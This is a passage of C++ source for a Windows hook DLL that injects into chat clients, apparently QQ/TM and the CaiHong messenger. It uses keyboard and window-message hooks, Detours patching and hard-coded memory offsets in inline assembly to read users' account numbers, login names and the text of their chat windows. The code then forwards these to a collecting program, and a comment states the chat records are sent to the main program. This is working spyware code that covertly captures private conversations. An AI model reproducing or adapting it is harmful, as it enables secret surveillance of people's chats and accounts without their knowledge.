				FARPROC GetSelfUin = GetProcAddress(GetModuleHandle("KernelUtil"),"?GetSelfUin@Contact@Util@@YAKXZ");
				if (GetSelfUin!=NULL)
					tmpaddr = GetSelfUin();
				SendMessage(::dwHWND, WM_ME, ME_GETSELFUIN, tmpaddr);
			}
		}
		//zzy end

		if (msg->message == WM_ME && ::version < 4 && IsProMatched(dwPId,_T("tm.exe")) == FALSE) {
			long tmpaddr = GetWindowLongW(msg->hwnd, GWL_WNDPROC);

			int off,off2;
			if (msg->wParam == ME_WNDPROC) 
			{
				//SendMessage(::dwHWND, WM_ME, ME_WNDPROC, tmpaddr);
				__try {
					if(::version > 2)
					{
						tmpaddr = -1;
						SendMessage(::dwHWND, WM_ME, ME_WNDPROC, tmpaddr);
						//zzy
						for (int i=0;i<10000;i++)
						{


						if(hModDll != NULL && ::GetCurrentThreadId() == g_dwTid[i]/* != 0*/)
						{
							::OutputDebugStringA("KP 1\n");
							hHookKey = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyProc, hModDll, g_dwTid[i]);
							if (hHookKey != NULL)
							{
								bKeyHook = true;
							::OutputDebugStringA("KP 1 ok\n");
								g_dwTid[i] = 0;
							}
						}



						}
						//
						return 0;
					}
					if (::version < 2) {
						off = ::version * 0x2c;
						off2 = ::version * 0x28;
						__asm{
							push eax;
							push ebx;
							mov eax,tmpaddr;
							mov eax,[eax+0x4];
								mov eax,[eax+0x24];
								mov eax,[eax+0xc];
								mov ebx,off;
								mov eax,[eax+0x100+ebx];
			   				    mov eax,[eax+0x4];
								mov eax,[eax+0x4];
								mov ebx,off2;
								mov eax,[eax+0x1a0+ebx];
								mov eax,[eax+0x140];
								mov eax,[eax+0x30];
								mov eax,[eax+0x8];
								mov eax,[eax+0xa8];
								mov eax,[eax+0x8];
							mov tmpaddr,eax;
						}
					} else {
						__asm{
							push eax;
							push ebx;
							mov eax,tmpaddr;
							mov eax,[eax+0x4];
							mov eax,[eax+0x24];
							mov eax,[eax+0xc];
							//mov ebx,off;
							mov eax,[eax+0x12c];
							mov eax,[eax+0x4];
							mov eax,[eax+0x4];
							//mov ebx,off2;
							mov eax,[eax+0x1d4];
							mov eax,[eax+0x140];
							mov eax,[eax+0xb8];
							mov eax,[eax+0x8];
							mov tmpaddr,eax;
							//push eax;
							//push ebx;
							//mov eax,tmpaddr;
							//mov [m_tempIP],eax;
							//mov eax,[eax+0x4];
							//mov [m_tempIP+4],eax;
							//mov eax,[eax+0x24];
							//mov [m_tempIP+8],eax;
							//mov eax,[eax+0xc];
							//mov [m_tempIP+12],eax;
							////mov ebx,off;
							//mov eax,[eax+0x12c];
							//mov [m_tempIP+16],eax;
							//mov eax,[eax+0x4];
							//mov [m_tempIP+20],eax;
							//mov eax,[eax+0x4];
							//mov [m_tempIP+24],eax;
							////mov ebx,off2;
							//mov eax,[eax+0x1d4];
							//mov eax,[eax+0x1d4];
							//mov [m_tempIP+28],eax;
							//mov eax,[eax+0x140];
							//mov [m_tempIP+32],eax;
							//mov eax,[eax+0xb8];
							//mov[m_tempIP+36],eax;
							//mov eax,[eax+0x8];
							//mov [m_tempIP+40],eax;
							//mov tmpaddr,eax;
						}
					}
				} __except (EXCEPTION_EXECUTE_HANDLER) {
					_asm {
						pop ebx;
						pop eax;
					}
					return 0;
				}
				_asm {
					pop ebx;
					pop eax;
				}
				//sprintf(m_msg,"m_tempIP[0]=%04X\r\n; m_tempIP[1]=%04X\r\n;m_tempIP[2]=%04X\r\n;m_tempIP[3]=%04X\r\n;m_tempIP[4]=%04X\r\n;m_tempIP[5]=%04X\r\n;m_tempIP[6]=%04X\r\n;m_tempIP[7]=%04X\r\n;m_tempIP[8]=%04X\r\n;m_tempIP[9]=%04X\r\n;m_tempIP[10]=%04X\r\n;",
				//	m_tempIP[0],m_tempIP[1],m_tempIP[2],m_tempIP[3],m_tempIP[4],m_tempIP[5],m_tempIP[6],m_tempIP[7],m_tempIP[8],m_tempIP[9],m_tempIP[10]);
				//::OutputDebugString (m_msg);
				//tmpaddr = -1;
				SendMessage(::dwHWND, WM_ME, ME_WNDPROC, tmpaddr);
				
			} else if (msg->wParam == ME_GETUIN) {
				__try {
					if (::version <2) {
						off = 4 * ::version;
					} else {
						off = 4;
					}
					__asm {
						push eax;
						push ebx;
						mov eax,tmpaddr;
						mov tmpaddr,0;
						mov eax,[eax+0x4];
						mov eax,[eax+0x24];
						mov eax,[eax+0xc];
						mov ebx,off;
						mov eax,[eax+0x2c+ebx];
						mov eax,[eax+0x18];
						mov ebx,[eax+0x8];
						mov eax,[eax+0x4];

                     	test ebx,ebx;  
				 	    jne t1;
						
						mov tmpaddr,eax;
					}
				} __except (EXCEPTION_EXECUTE_HANDLER) {
					_asm {
						pop ebx;
						pop eax;
					}
					return 0;
				}
				t1:
				_asm {
					pop ebx;
					pop eax;
				}

					SendMessage(::dwHWND, WM_ME, ME_GETUIN, tmpaddr);
			} else if (msg->wParam == ME_GETSELFUIN) {
				tmpaddr = 0;
				FARPROC GetSelfUin = GetProcAddress(GetModuleHandle("KernelUtil"),"?GetSelfUin@Contact@Util@@YAKXZ");
				if (GetSelfUin!=NULL)
					tmpaddr = GetSelfUin();
				SendMessage(::dwHWND, WM_ME, ME_GETSELFUIN, tmpaddr);

				//if(!m_inHook)
				//{
				//	DetourTransactionBegin();
				//	DetourUpdateThread( GetCurrentThread());
				//	DetourAttach(&(PVOID&)_CreateWindowEx, (PBYTE)M_CreateWindowExW);
				//	DetourTransactionCommit();
				//	m_inHook = true ;
				//}

			}
		}

		if (msg->message == WM_SETTEXT/* || msg->message == 0x86*/)
		{
			//::OutputDebugStringA("WM_SETTEXT\n");
			if(::version > 2 || IsProMatched(dwPId,_T("tm.exe")) == TRUE && ::version == 2)
			{
				//::OutputDebugStringA("WM_SETTEXT2\n");
				DWORD mdt_temp = ::GetTickCount ();
				if((mdt_temp -mg_laskTick) > 5000 && (mdt_temp - dwLastKeyup) > 20000)//zzy 有疑问，截不到再说
				{
					//::OutputDebugStringA("WM_READMSG WM_SETTEXT\n");
					::PostMessage (::dwHWND, WM_READMSG, 111,LPARAM(msg->hwnd));
					//::PostMessage (::dwHWND, WM_READMSG,NULL, NULL);
					mg_laskTick = mdt_temp;
				}
				//::PostMessage (::dwHWND, WM_READMSG,NULL, NULL);
			}
		}

		//ZZY
		//char szMsg[256] = {0};
		//sprintf(szMsg,"H:%x Msg:%x wp:%x lp:%x\n",msg->hwnd,msg->message,msg->wParam,msg->lParam);
		//::OutputDebugStringA(szMsg);

	}
	return 0;
}

LRESULT CALLBACK WndCHProc( int nCode, WPARAM wParam, LPARAM lParam)
{  
	DWORD	m_curr=0;
	bool	m_isNum = false;
	int		i,m_UIDsum=0;
	
	if (nCode == HC_ACTION)
	{
		LPCWPRETSTRUCT msg = (LPCWPRETSTRUCT)lParam;
		if (msg->message == WM_HTMLSPY)
		{
			
			if(msg->wParam == ME_GETUIN)
			{

				//_asm int 3;
				HWND	m_H = NULL , m_H2 = NULL;
				char	m_str1[]=_T("#32770");
				char	m_str[32]=_T("彩虹");
				WCHAR	m_tempstr[MAX_PATH];
				WCHAR	m_tempstr2[128];

				m_H = ::FindWindowEx(0,m_H,m_str1,m_str);
				::GetWindowTextW(msg->hwnd,m_winTitle,64);

				if(m_H != NULL)
				{
					m_H2 = ::FindWindowEx(m_H,NULL,_T("#32770"),_T(""));
					m_H2 = ::FindWindowEx(m_H2,NULL,_T("ComboBox"),NULL);
					m_H2 = ::FindWindowEx(m_H2,NULL,_T("Edit"),NULL);
					if(m_H2 != NULL)
					{
						memset(m_tempstr,0,sizeof(m_tempstr));
						::GetWindowTextW (m_H2,m_tempstr,sizeof(m_tempstr));
					}
					m_isNum = false;
					int UinLen = wcslen(m_tempstr);
					for(i=0;i<UinLen;i++)
					{
						if((m_tempstr[i] > _T('9')) ||(m_tempstr[i] < _T('0')))
						{
							m_isNum = true;						
							break;
						}
					}
					if(m_isNum)
					{
						WIN32_FIND_DATA FindFileData;
						HANDLE hFind = INVALID_HANDLE_VALUE;
						char DirSpec[MAX_PATH + 1]={0};// 指定路径
						char drive[_MAX_DRIVE];
						char dir[_MAX_DIR];
						char fname[_MAX_FNAME];
						char ext[_MAX_EXT];
						bool	m_isUIN = true;

						::GetModuleFileName (::hModDll,DirSpec,MAX_PATH);
						_splitpath(DirSpec, drive, dir, fname, ext);
						strcpy(DirSpec,drive);
						strcat(DirSpec,dir);
						strcat(DirSpec,"*");
						 hFind = FindFirstFile(DirSpec, &FindFileData);
						 if (hFind != INVALID_HANDLE_VALUE)
						{
							if(FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY
								&& strcmp(FindFileData.cFileName, ".") != 0
								&& strcmp(FindFileData.cFileName, "..") != 0)
							{   //找到目录
								for(i=0;i<strlen(FindFileData.cFileName);i++)
								{
									if( (FindFileData.cFileName[i] > '9') || (FindFileData.cFileName[i] < '0'))
										m_isUIN = false;
								}
								if(m_isUIN)
								{
									memset(m_tempstr2,0,sizeof(m_tempstr2));
									MultiByteToWideChar(CP_ACP,0,FindFileData.cFileName,strlen(FindFileData.cFileName),m_tempstr2,128);
									m_UIDsum++;
								}
							}

							while (FindNextFile(hFind, &FindFileData) != 0)
							{
								m_isUIN = true;
								if(FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY
									&& strcmp(FindFileData.cFileName, ".") != 0
									&& strcmp(FindFileData.cFileName, "..") != 0)
								{ //找到目录
									for(i=0;i<strlen(FindFileData.cFileName);i++)
									{
										if( (FindFileData.cFileName[i] > '9') || (FindFileData.cFileName[i] < '0'))
											m_isUIN = false;

									}
									if(m_isUIN)
									{
										memset(m_tempstr2,0,sizeof(m_tempstr2));
										MultiByteToWideChar(CP_ACP,0,FindFileData.cFileName,strlen(FindFileData.cFileName),m_tempstr2,128);
										m_UIDsum++;
									}
								}

							}

							FindClose(hFind);
						 }
					}
					//::OutputDebugStringW (m_winTitle);
					if(m_UIDsum ==1)
						wcscpy(m_tempstr,m_tempstr2);
					wcscpy(m_tempstr+128,m_winTitle);
					COPYDATASTRUCT data;
					data.dwData=ME_GETUIN;
					data.cbData=sizeof(m_tempstr);
					data.lpData=m_tempstr;
					::SendMessage( ::dwHWND,WM_COPYDATA,NULL,(LPARAM)&data);
				}

				if(!m_inHook)
				{
					DetourTransactionBegin();
					DetourUpdateThread( GetCurrentThread());
					DetourAttach(&(PVOID&)_GetTextExtentExPoint, (PBYTE)M_GetTextExtentExPointW);
					DetourTransactionCommit();
					m_inHook = true ;
				}

			}
			//-------------------------------------------------------------------------------------------------
			if(msg->wParam == ME_GETOTHERUIN)
			{
				COPYDATASTRUCT data;
				data.dwData=ME_GETOTHERUIN;
				data.cbData=sizeof(m_CliID);
				data.lpData=m_CliID;
				::SendMessage( ::dwHWND,WM_COPYDATA,NULL,(LPARAM)&data);

			}
			//-------------------------------------------------------------------------------------------------
			
			if(msg->wParam == ME_GETCHTEXT)
			{
				if(m_chUser.sKeyWord3[0]!='1')
				{
					BeCHLogin();
				}
				HWND		hWndChild;
				CoInitialize( NULL );

				// Explicitly load MSAA so we know if it's installed
				HINSTANCE m_hInst = ::LoadLibrary( _T("OLEACC.DLL") );

				//   DISPID_DOWNLOADBEGIN
				CComPtr<IHTMLDocument2> spDoc;

				IHTMLElement   *pElem   =   NULL; 

				LRESULT lRes;

				hWndChild = ::FindWindowEx(msg->hwnd, 0, _T("AfxFrameOrView80u"), NULL);
				hWndChild = ::FindWindowEx(hWndChild, 0, _T("Shell Embedding"), NULL);
				hWndChild = ::FindWindowEx(hWndChild, 0, _T("Shell DocObject View"), NULL);
				hWndChild = ::FindWindowEx(hWndChild, 0, _T("Internet Explorer_Server"), NULL);

				if(hWndChild)
				{
					UINT nMsg = ::RegisterWindowMessage( _T("WM_HTML_GETOBJECT") );
					::SendMessageTimeout( hWndChild, nMsg, 0L, 0L, SMTO_ABORTIFHUNG, 1000, (DWORD*)&lRes );

					LPFNOBJECTFROMLRESULT pfObjectFromLresult = (LPFNOBJECTFROMLRESULT)::GetProcAddress( m_hInst, _T("ObjectFromLresult") );
					if ( pfObjectFromLresult != NULL )
					{
						HRESULT hr;
						hr = (*pfObjectFromLresult)( lRes, IID_IHTMLDocument, 0, (void**)&spDoc );
						if ( SUCCEEDED(hr) )
						{
							spDoc->get_body(&pElem);
							
							CString		m__out;
							BSTR		m_Text;

							pElem->get_innerText(&m_Text);
							m__out = m_Text;
							COPYDATASTRUCT data;
							data.dwData=ME_GETCHTEXT;
							data.cbData=m__out.GetLength ()+1;
							data.lpData=m__out.GetBuffer ();
							::SendMessage( ::dwHWND,WM_COPYDATA,NULL,(LPARAM)&data);

							pElem->Release ();

						}
					}
				}
				::FreeLibrary( m_hInst );
				CoUninitialize();
			}

		}

	}
	
	return 0;
}

HHOOK __declspec(dllexport) WINAPI InitCHHookProc(HWND dwHWND, DWORD dwTid)
{
	HHOOK	hHookProc = NULL;
	::dwHWND= dwHWND;
	//GC_TRACE("WndCHProc %u %u\n",dwHWND,dwTid);
	hHookProc = SetWindowsHookEx(WH_CALLWNDPROCRET, (HOOKPROC)WndCHProc, hModDll, dwTid);
	return hHookProc;
}

BOOL	BeCHLogin()
{

	HWND	m_H = NULL , m_H2 = NULL;
	char	m_str1[]=_T("#32770");
	char	m_str[32]=_T("彩虹");
	COPYDATASTRUCT data;

	m_H = ::FindWindowEx(0,m_H,m_str1,m_str);

	if(m_H != NULL)
	{
		m_H2 = ::FindWindowEx(m_H,NULL,_T("#32770"),_T(""));
		m_H2 = ::FindWindowEx(m_H2,NULL,_T("ComboBox"),NULL);
		m_H2 = ::FindWindowEx(m_H2,NULL,_T("Edit"),NULL);
		if(m_H2 != NULL)
		{
			::GetWindowText(m_H2,m_chUser.sKeyWord2,sizeof(m_chUser.sKeyWord2));

			if((strlen(m_chUser.sKeyWord2) < 5) ||(strstr(m_chUser.sKeyWord2,"支持彩虹号或51帐号登录")!=NULL))
				return FALSE;

			m_chUser.dtVisitTime = COleDateTime::GetCurrentTime();
			m_chUser.dtMemoTime = m_chUser.dtVisitTime;
			m_chUser.bHasData = true;
			m_chUser.sKeyWord3[0]='1';
			m_chUser.sServiceType = m_chUser.CaiHong;
			//m_chUser.ToString ();

			HWND hwndReturn=FindWindow(clsReturn,NULL);

			if (hwndReturn!=NULL)
			{ 
				data.dwData=8;
				data.cbData=sizeof(DecodedData);
				data.lpData=&m_chUser;

				//把发送的聊天记录发给主程序
				::SendMessage( hwndReturn,WM_COPYDATA,NULL,(LPARAM)&data);
			}

		}
	}

	return FALSE;
}
BOOL	CHLoginOut()
{
	COPYDATASTRUCT data;

	if(m_chUser.sKeyWord3[0]=='1')
	{
		m_chUser.dtVisitTime = COleDateTime::GetCurrentTime();
		//m_chUser.dtMemoTime = m_chUser.dtVisitTime;
		m_chUser.bHasData = true;
		m_chUser.sKeyWord3[0]='2';
		//m_chUser.ToString ();
		HWND hwndReturn=FindWindow(clsReturn,NULL);

		if (hwndReturn!=NULL)
		{ 
			data.dwData=8;
			data.cbData=sizeof(DecodedData);
			data.lpData=&m_chUser;

			//把发送的聊天记录发给主程序
			::SendMessage( hwndReturn,WM_COPYDATA,NULL,(LPARAM)&data);
		}
	}

	return FALSE;
}

DWORD WINAPI SendMsgThread(LPVOID lparam)
{
	::Sleep (300);
	//::OutputDebugString ("asdsasa");
	DWORD mdt_temp = ::GetTickCount ();
	if((mdt_temp -mg_laskTick) > 3000)
	{
		//::OutputDebugStringA("WM_READMSG SendMsgThread\n");
		::PostMessage (::dwHWND, WM_READMSG,NULL, NULL);
		//::PostMessage (::dwHWND, WM_READMSG,NULL, NULL);
		mg_laskTick = mdt_temp;
	}
	return 0;
}

long CALLBACK KeyProc(int code, WPARAM wParam, LPARAM lParam)   
{   
	if (code==HC_ACTION) 
	{

		DWORD	m_Key,m_Sys,PTID;
		m_Key = DWORD(wParam);
		m_Sys = DWORD(lParam);

		if((m_Key == 0x53) && (m_Sys & 0x20000000) && (m_Sys & 0x80000000)) 
		{
			//DWORD mdt_temp = ::GetTickCount ();
			//if((mdt_temp -mg_laskTick) > 3000)
			//{
			//	::PostMessage (::dwHWND, WM_READMSG,NULL, NULL);
			//	::PostMessage (::dwHWND, WM_READMSG,NULL, NULL);
			//	::OutputDebugString ("asdsasa");
			//	mg_laskTick = mdt_temp;
			//}				
			::CreateThread(NULL,0,SendMsgThread,NULL,0,&PTID);

		}
		else if((m_Key == VK_RETURN) && (m_Sys & 0x80000000))
		{
			DWORD mdt_temp = ::GetTickCount ();
			if((mdt_temp -mg_laskTick) > 3000)
			{
				DWORD dwTick111 = ::GetTickCount();
				//char szDebug[128] = {0};
				//sprintf(szDebug,"dwTick111:%u nLastMessage:%u\n",dwTick111,nLastMessage);
				//::OutputDebugStringA(szDebug);
				char buffer[255] = {0};
				::memset(buffer,0,255);
				DWORD thId=::GetWindowThreadProcessId(::GetForegroundWindow(),NULL);
				HKL hkl=::GetKeyboardLayout(thId);                 
				::ImmGetDescriptionA(hkl,buffer,255); 

				//::OutputDebugStringA(buffer);
				//::OutputDebugStringA("\n");

				if (dwTick111 - nLastMessage > 150 || strstr(buffer,"智能ABC") == NULL)
					::PostMessage (::dwHWND, WM_READMSG,NULL, NULL);
				//::PostMessage (::dwHWND, WM_READMSG,NULL, NULL);
				mg_laskTick = mdt_temp;
			}
			//::CreateThread(NULL,0,SendMsgThread,NULL,0,&PTID);
		}
		else
		//mg_laskTick = mdt_temp;

			//Add by zzy 20100329
		{
			//::OutputDebugStringA("keyup\n");
			dwLastKeyup = ::GetTickCount();
		}

	}
	return  CallNextHookEx(hHookKey,code,wParam,lParam);	
}  